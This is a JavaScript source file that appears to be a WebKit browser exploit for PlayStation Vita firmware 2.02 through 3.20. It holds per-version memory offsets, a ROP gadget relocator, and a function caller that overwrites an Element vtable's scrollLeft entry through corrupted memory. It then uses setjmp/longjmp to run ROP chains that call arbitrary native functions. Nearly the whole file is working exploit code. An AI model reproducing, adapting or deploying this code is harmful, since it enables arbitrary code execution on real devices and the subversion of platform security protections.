/*
    ROP planning (Firmware 2.02, 2.05, 2.12, 3.00, 3.01, 3.15, 3.18 and 3.20)
*/

/*
    Version offsets
*/
function defineOffsets()
{
	ver_offsets = {
		v2_02:{
				scewkbase_off : 0x3739f3,
				scelibcentry_off: 0x68e27c, 
				scelibnetentry_off: 0x68e248,
				scekernentry_off: 0x68e258,
				scekernbase_off: 0x93dd,
				scelibcbase_off: 0xc9ad,
				scelibnetbase_off: 0x2aed,
				elementvtable_off: -0x68,
				setscrollleft_off: 0x5b
			},
		v2_05:{
				scewkbase_off : 0x373a93,
				scelibcentry_off: 0x68e324, 
				scelibnetentry_off: 0x68e2f0,
				scekernentry_off: 0x68e300,
				scekernbase_off: 0x93dd,
				scelibcbase_off: 0xc9ad,
				scelibnetbase_off: 0x2aed,
				elementvtable_off: -0x68,
				setscrollleft_off: 0x5b
			},
		v2_12:{
				scewkbase_off : 0x3cbb5d,
				scelibcentry_off: 0x6bd6ec, 
				scelibnetentry_off: 0x6bd6b8,
				scekernentry_off: 0x6bd6c8,
				scekernbase_off: 0xa085,
				scelibcbase_off: 0xfafd,
				scelibnetbase_off: 0x2515,
				elementvtable_off: -0x68,
				setscrollleft_off: 0x5b
			},
		v3_00:{
				scewkbase_off : 0x3d73a9,
				scelibcentry_off: 0x6c4718, 
				scelibnetentry_off: 0x6c46f0,
				scekernentry_off: 0x6c46f4,
				scekernbase_off: 0x8291,
				scelibcbase_off: 0xfafd,
				scelibnetbase_off: 0x22d5,
				elementvtable_off: -0x68,
				setscrollleft_off: 0x5b
			},
		v3_01:{
				scewkbase_off : 0x3d73a9,
				scelibcentry_off: 0x6c4718,
				scelibnetentry_off: 0x6c46e4,
				scekernentry_off: 0x6c46f4,
				scekernbase_off: 0x8291,
				scelibcbase_off: 0xfafd,
				scelibnetbase_off: 0x22d9,
				elementvtable_off: -0x68,
				setscrollleft_off: 0x5b
			},
		v3_15:{
				scewkbase_off : 0x3cc619,
				scelibcentry_off: 0x6b5700, 
				scelibnetentry_off: 0x6b56cc,
				scekernentry_off: 0x6b56dc,
				scekernbase_off: 0x82d9,
				scelibcbase_off: 0xf989,
				scelibnetbase_off: 0x22d1,
				elementvtable_off: -0x68,
				setscrollleft_off: 0x5b
			},
		v3_18:{ 
				scewkbase_off : 0x3cc619,
				scelibcentry_off: 0x6b56b0, 
				scelibnetentry_off: 0x6b567c,
				scekernentry_off: 0x6b568c,
				scekernbase_off: 0x82d9,
				scelibcbase_off: 0xf989,
				scelibnetbase_off: 0x22d1,
				elementvtable_off: -0x68,
				setscrollleft_off: 0x5b
			},
		v3_20:{
				scewkbase_off : 0x3cc625,
				scelibcentry_off: 0x6b56bc,
				scelibnetentry_off: 0x6b5688,
				scekernentry_off: 0x6b5698,
				scekernbase_off: 0x82d9,
				scelibcbase_off: 0xf989,
				scelibnetbase_off: 0x22d1,
				elementvtable_off: -0x68,
				setscrollleft_off: 0x5b
			}	
	}
}

/*
    Gadget initializer
*/
function init_ggts(bases, caller, ver)
{
    var results = version_deps[ver];
    for (b in bases)
	{
        if (bases.hasOwnProperty(b)) 
		{
            func_list = results[b].functions;
            for (fcn in func_list) 
			{
                if (func_list.hasOwnProperty(fcn)) 
				{
                    func_list[fcn] = caller(func_list[fcn] + bases[b], results);
                }
            }
            gadgets = results[b].gadgets;
            for (ggt in gadgets)
			{
                if (gadgets.hasOwnProperty(ggt))
				{
                    gadgets[ggt]= gadgets[ggt] + bases[b];
                }
            } 
        }
    }
    return results;
}

/*
   Function caller
*/
function get_caller(tmpmem, element, vtidx, fkvtable, version)
{
    return function (fcn, libraries)
	{
        return function(r0, r1, r2, r3, ip)
		{
            var allocate_tmp = init_memory(tmpmem);
            var context_size = 0x30;
            var eleobj_size = 0x1e;

            var scontext = allocate_tmp(context_size * 4);
            var seleobj = allocate_tmp(eleobj_size * 4);
            var scewkggts = libraries.SceWebKit.gadgets;
            var scelibcggts = libraries.SceLibc.gadgets;

			// Save Element object
            for (var i = 0; i < eleobj_size; i++) {
                aspace32[(seleobj + (i << 2)) / 4] = aspace32[(vtidx + (i << 2)) / 4];
            }

			// Call setjmp
            aspace32[(fkvtable + (0x5b << 2)) / 4] = scelibcggts.scesetjmp;
            element.scrollLeft = 0xdeadbabe;

            // Save jmp context
            for (var i = 0; i < context_size; i++) {
                aspace32[(scontext + (i << 2)) / 4] = aspace32[(vtidx + (i << 2)) / 4];
            }

            // Restore Element object
            for (var i = 0; i < 30; i++) {
                aspace32[(vtidx + (i << 2)) / 4] = aspace32[(seleobj + (i << 2)) / 4];
            }
			
			var retval = allocate_tmp(0x4);

			if ((version == "v2_02") || (version == "v2_05"))
			{
				// ROP chain for FWs 2.02 and 2.05
				var r0values = allocate_tmp(0x10 * 4);
				var r2values = allocate_tmp(0x10 * 4);
				var r2values_4 = allocate_tmp(0x10 * 4);
				var r4values = allocate_tmp(0x10 * 4);
				var r4values_2 = allocate_tmp(0x10 * 4);
				
				mymemset(retval, 0, 4);	
				
				aspace32[(r0values / 4)] = r2values;                            // r2
				aspace32[((r0values + 4) / 4)] = r4values_2;                    // r4
				aspace32[((r0values + 8) / 4)] = 0x0;                           // r5
				aspace32[((r0values + 12) / 4)] = 0x0;		                    // r8
				aspace32[((r0values + 16) / 4)] = 0x0;                          // fp
				aspace32[((r0values + 20) / 4)] = 0x0;                          // ip
				aspace32[((r0values + 24) / 4)] = scewkggts.ldmr2;              // pc
				
				aspace32[(r2values / 4)] = r0;		                            // r0
				aspace32[((r2values + 4) / 4)] = r1;                           	// r1
				aspace32[((r2values + 8) / 4)] = r2;                           	// r2
				aspace32[((r2values + 12) / 4)] = r3;		                    // r3
				aspace32[((r2values + 16) / 4)] = ip;                           // ip
				aspace32[((r2values + 20) / 4)] = scewkggts.ldmr4_2;            // lr
				aspace32[((r2values + 24) / 4)] = fcn;              			// pc
				
				aspace32[(r4values_2 / 4)] = r2values_4;                     	// r2
				aspace32[((r4values_2 + 4) / 4)] = 0x0;                   		// ip
				aspace32[((r4values_2 + 8) / 4)] = scewkggts.ldmr2_4;       	// lr
				aspace32[((r4values_2 + 12) / 4)] = scewkggts.movr30;      		// pc
				
				aspace32[(r2values_4 / 4)] = retval - 4;                     	// r0
				aspace32[((r2values_4 + 4) / 4)] = 0x0; 	                    // r1
				aspace32[((r2values_4 + 8) / 4)] = r4values;                  	// r4
				aspace32[((r2values_4 + 12) / 4)] = 0x0;                   		// ip
				aspace32[((r2values_4 + 16) / 4)] = scewkggts.ldmr4;       		// lr
				aspace32[((r2values_4 + 20) / 4)] = scewkggts.str3;      		// pc
				
				aspace32[(r4values / 4)] = scontext;                     		// r0
				aspace32[((r4values + 4) / 4)] = 0x0;       		      		// r1
				aspace32[((r4values + 8) / 4)] = 0x0;                   		// ip
				aspace32[((r4values + 12) / 4)] = 0x0; 					 		// lr
				aspace32[((r4values + 16) / 4)] = scelibcggts.scelongjmp;       // pc
				
				var ropchain = [r0values, 0x41414141, 0x41414141, scewkggts.ldmr0];
				var rchainaddr = allocate_tmp(ropchain.length * 4);
				
				// Copy ROPchain
				for (var i = 0; i < ropchain.length; i++) {
					aspace32[(rchainaddr + (i << 2)) / 4] = ropchain[i];
				}

				// Trigger ROPchain
				aspace32[(fkvtable + (0x5b << 2)) / 4] = scewkggts.ldmr1; 
				element.scrollLeft = rchainaddr;
			}
			else if (version == "v2_12")
			{
				// ROP chain for FW 2.12
				var r2values = allocate_tmp(0x10 * 4);
				var r8values = allocate_tmp(0x10 * 4);
				var r4values = allocate_tmp(0x10 * 4);
				var r4values_8 = allocate_tmp(0x10 * 4);
				var r4values_1 = allocate_tmp(0x10 * 4);
				var r1values_0 = allocate_tmp(0x10 * 4);
				
				mymemset(retval, 0, 4);

				aspace32[(r2values / 4)] = 0x0;                                	// r0
				aspace32[((r2values + 4) / 4)] = 0x0;                          	// r1
				aspace32[((r2values + 8) / 4)] = 0x0;                     		// r2
				aspace32[((r2values + 12) / 4)] = r3;                    		// r3
				aspace32[((r2values + 16) / 4)] = 0x0;                         	// ip
				aspace32[((r2values + 20) / 4)] = 0x0;                         	// lr
				aspace32[((r2values + 24) / 4)] = scewkggts.ldmr4_8;            // pc
				
				aspace32[(r4values_8 / 4)] = 0x0;                               // r0
				aspace32[((r4values_8 + 4) / 4)] = 0x0;                         // r1
				aspace32[((r4values_8 + 8) / 4)] = r8values;                    // r8
				aspace32[((r4values_8 + 12) / 4)] = 0x0;                        // ip
				aspace32[((r4values_8 + 16) / 4)] = 0x0;                        // lr
				aspace32[((r4values_8 + 20) / 4)] = scewkggts.ldmr8;            // pc

				aspace32[(r8values / 4)] = r0;                                  // r0
				aspace32[((r8values + 4) / 4)] = r1;                            // r1
				aspace32[((r8values + 8) / 4)] = r2;                            // r2
				aspace32[((r8values + 12) / 4)] = r4values_1;                   // r4
				aspace32[((r8values + 16) / 4)] = 0x0; 		                    // r5
				aspace32[((r8values + 20) / 4)] = ip;                           // ip
				aspace32[((r8values + 24) / 4)] = scewkggts.ldmr4_1;            // lr
				aspace32[((r8values + 28) / 4)] = fcn;                          // pc (actual function)

				aspace32[(r4values_1 / 4)] = r1values_0;                        // r1
				aspace32[((r4values_1 + 4) / 4)] = 0x0;                         // ip
				aspace32[((r4values_1 + 8) / 4)] = scewkggts.ldmr1_0;           // lr
				aspace32[((r4values_1 + 12) / 4)] = scewkggts.movr30;           // pc

				aspace32[(r1values_0 / 4)] = retval - 4;                        // r0
				aspace32[((r1values_0 + 4) / 4)] = 0x0;                         // r1
				aspace32[((r1values_0 + 8) / 4)] = 0x0;                         // r2
				aspace32[((r1values_0 + 12) / 4)] = r4values;                   // r4
				aspace32[((r1values_0 + 16) / 4)] = 0x0;                   		// ip
				aspace32[((r1values_0 + 20) / 4)] = scewkggts.ldmr4;            // lr
				aspace32[((r1values_0 + 24) / 4)] = scewkggts.str3;             // pc

				aspace32[(r4values / 4)] = scontext;                            // r0
				aspace32[((r4values + 4) / 4)] = 0x0;                           // r1
				aspace32[((r4values + 8) / 4)] = 0x0;                           // r2
				aspace32[((r4values + 12) / 4)] = 0x0;                          // ip
				aspace32[((r4values + 16) / 4)] = 0x0;                          // lr
				aspace32[((r4values + 20) / 4)] = scelibcggts.scelongjmp;       // pc
				
				var ropchain = [0x0, 0x0, r2values, r4values_8, 0x41414141, 0x41414141, scewkggts.ldmr2];
				var rchainaddr = allocate_tmp(ropchain.length * 4);
				
				// Copy ROPchain
				for (var i = 0; i < ropchain.length; i++) {
					aspace32[(rchainaddr + (i << 2)) / 4] = ropchain[i];
				}

				// Trigger ROPchain
				aspace32[(fkvtable + (0x5b << 2)) / 4] = scewkggts.ldmr1; 
				element.scrollLeft = rchainaddr;
			}
			else if ((version == "v3_00") || (version == "v3_01"))
			{
				// ROP chain for FWs 3.00 and 3.01
				var r0values = allocate_tmp(0x10 * 4);
				var r9values = allocate_tmp(0x10 * 4);
				var r8values = allocate_tmp(0x10 * 4);
				var r4values = allocate_tmp(0x10 * 4);
				var r1values_0 = allocate_tmp(0x10 * 4);
				var r5values = allocate_tmp(0x10 * 4);

				mymemset(retval, 0, 4);
				
				aspace32[(r0values / 4)] = 0x0;                                 // r0
				aspace32[((r0values + 4) / 4)] = r3;                            // r3
				aspace32[((r0values + 8) / 4)] = 0x0;                           // r4
				aspace32[((r0values + 12) / 4)] = r9values;                     // r9
				aspace32[((r0values + 16) / 4)] = 0x0;                          // fp
				aspace32[((r0values + 20) / 4)] = 0x0;                          // ip
				aspace32[((r0values + 24) / 4)] = scewkggts.ldmr9;              // pc
							
				aspace32[(r9values / 4)] = 0x0;                                 // r2
				aspace32[((r9values + 4) / 4)] = 0x0;                           // r5
				aspace32[((r9values + 8) / 4)] = r8values;                      // r8
				aspace32[((r9values + 12) / 4)] = 0x0;                   		// ip
				aspace32[((r9values + 16) / 4)] = 0x0;                     		// lr
				aspace32[((r9values + 20) / 4)] = scewkggts.ldmr8;              // pc
				
				aspace32[(r8values / 4)] = r0;                                  // r0
				aspace32[((r8values + 4) / 4)] = r1;                            // r1
				aspace32[((r8values + 8) / 4)] = r2;                            // r2
				aspace32[((r8values + 12) / 4)] = r4values; 		            // r4
				aspace32[((r8values + 16) / 4)] = r5values;                     // r5
				aspace32[((r8values + 20) / 4)] = ip;                           // ip
				aspace32[((r8values + 24) / 4)] = scewkggts.ldmr4;              // lr
				aspace32[((r8values + 28) / 4)] = fcn;                          // pc (actual function)
				
				aspace32[(r4values / 4)] = r1values_0;                          // r1
				aspace32[((r4values + 4) / 4)] = 0x0;                           // r3
				aspace32[((r4values + 8) / 4)] = 0x0;                           // ip
				aspace32[((r4values + 12) / 4)] = scewkggts.ldmr1_0;   			// lr
				aspace32[((r4values + 16) / 4)] = scewkggts.movr30;             // pc
				
				aspace32[(r1values_0 / 4)] = retval - 4;                        // r0
				aspace32[((r1values_0 + 4) / 4)] = 0x0;                         // ip
				aspace32[((r1values_0 + 8) / 4)] = scewkggts.ldmr5;   		    // lr
				aspace32[((r1values_0 + 12) / 4)] = scewkggts.str3;             // pc
				
				aspace32[(r5values / 4)] = scontext;                          	// r0
				aspace32[((r5values + 4) / 4)] = 0x0;                        	// r2
				aspace32[((r5values + 8) / 4)] = 0x0;                           // r3
				aspace32[((r5values + 12) / 4)] = 0x0;		                    // r4
				aspace32[((r5values + 16) / 4)] = 0x0;                          // r5
				aspace32[((r5values + 20) / 4)] = 0x0;                          // ip
				aspace32[((r5values + 24) / 4)] = 0x0;              			// lr
				aspace32[((r5values + 28) / 4)] = scelibcggts.scelongjmp;       // pc
				
				var ropchain = [r0values, 0x41414141, 0x41414141, scewkggts.ldmr0];
				var rchainaddr = allocate_tmp(ropchain.length * 4);
            
				// Copy ROPchain
				for (var i = 0; i < ropchain.length; i++) {
					aspace32[(rchainaddr + (i << 2)) / 4] = ropchain[i];
				}

				// Trigger ROPchain
				aspace32[(fkvtable + (0x5b << 2)) / 4] = scewkggts.ldmr1;
				element.scrollLeft = rchainaddr;
			}
			else
			{
				// ROP chain for FWs 3.15, 3.18 and 3.20
				var r0values = allocate_tmp(0x10 * 4);
				var r8values = allocate_tmp(0x10 * 4);
				var r4values = allocate_tmp(0x10 * 4);
				var r4values_0 = allocate_tmp(0x10 * 4);
				var r5values = allocate_tmp(0x10 * 4);
				var r1values_0 = allocate_tmp(0x10 * 4);
				
				mymemset(retval, 0, 4);

				aspace32[(r0values / 4)] = 0x0;                                 // r1
				aspace32[((r0values + 4) / 4)] = r3;                            // r3
				aspace32[((r0values + 8) / 4)] = 0x0;                           // r4
				aspace32[((r0values + 12) / 4)] = r8values;                     // r8
				aspace32[((r0values + 16) / 4)] = 0x0;                          // fp
				aspace32[((r0values + 20) / 4)] = 0x0;                          // ip
				aspace32[((r0values + 24) / 4)] = scewkggts.ldmr8;              // pc

				aspace32[(r8values / 4)] = r0;                                  // r0
				aspace32[((r8values + 4) / 4)] = r1;                            // r1
				aspace32[((r8values + 8) / 4)] = r2;                            // r2
				aspace32[((r8values + 12) / 4)] = r4values_0;                   // r4
				aspace32[((r8values + 16) / 4)] = r5values;                     // r5
				aspace32[((r8values + 20) / 4)] = ip;                           // ip
				aspace32[((r8values + 24) / 4)] = scewkggts.ldmr5;              // lr
				aspace32[((r8values + 28) / 4)] = fcn;                          // pc (actual function)

				aspace32[(r5values / 4)] = r1values_0;                          // r1
				aspace32[((r5values + 4) / 4)] = 0x0;                           // r3
				aspace32[((r5values + 8) / 4)] = 0x0;                           // ip
				aspace32[((r5values + 12) / 4)] = scewkggts.ldmr4_0;            // lr
				aspace32[((r5values + 16) / 4)] = scewkggts.movr30;             // pc

				aspace32[(r4values_0 / 4)] = retval - 4;                        // r0
				aspace32[((r4values_0 + 4) / 4)] = 0x0;                         // ip
				aspace32[((r4values_0 + 8) / 4)] = scewkggts.ldmr1_0;           // lr
				aspace32[((r4values_0 + 12) / 4)] = scewkggts.str3;             // pc

				aspace32[(r1values_0 / 4)] = 0x0;                               // r0
				aspace32[((r1values_0 + 4) / 4)] = 0x0;                         // r1
				aspace32[((r1values_0 + 8) / 4)] = 0x0;                         // r2
				aspace32[((r1values_0 + 12) / 4)] = r4values;                   // r4
				aspace32[((r1values_0 + 16) / 4)] = 0x0;                        // ip
				aspace32[((r1values_0 + 20) / 4)] = 0x0;                        // lr
				aspace32[((r1values_0 + 24) / 4)] = scewkggts.ldmr4;            // pc

				aspace32[(r4values / 4)] = scontext;                            // r0
				aspace32[((r4values + 4) / 4)] = 0x0;                           // r1
				aspace32[((r4values + 8) / 4)] = 0x0;                           // r2
				aspace32[((r4values + 12) / 4)] = 0x0;                          // ip
				aspace32[((r4values + 16) / 4)] = 0x0;                          // lr
				aspace32[((r4values + 20) / 4)] = scelibcggts.scelongjmp;       // pc
				
				var ropchain = [r0values, 0x41414141, 0x41414141, scewkggts.ldmr0];
				var rchainaddr = allocate_tmp(ropchain.length * 4);
				
				// Copy ROPchain
				for (var i = 0; i < ropchain.length; i++) {
					aspace32[(rchainaddr + (i << 2)) / 4] = ropchain[i];
				}

				// Trigger ROPchain
				aspace32[(fkvtable + (0x5b << 2)) / 4] = scewkggts.ldmr1; 
				element.scrollLeft = rchainaddr;
			}	
			
            return aspace32[(retval / 4)];
        }
    };
}